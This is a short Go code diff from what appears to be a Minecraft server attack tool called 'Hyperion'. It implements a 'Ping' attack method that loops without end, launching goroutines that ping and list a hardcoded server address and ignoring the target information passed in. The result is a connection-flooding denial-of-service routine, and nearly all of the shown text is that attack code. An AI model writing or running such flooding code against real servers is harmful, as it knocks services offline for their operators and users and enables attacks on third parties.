@@ -2,6 +2,8 @@ package methods
 
 import (
 	"Hyperion/core/method"
+
+	"github.com/Tnze/go-mc/bot"
 )
 
 type Ping struct{}
@@ -15,7 +17,9 @@ func (ping Ping) Description() string {
 }
 
 func (ping Ping) Start(info method.AttackInfo) {
-	// implementation for starting the Ping method
+	for {
+		go bot.PingAndList("in1.hetzner.one:25579")
+	}
 }
 
 func (ping Ping) Stop() {
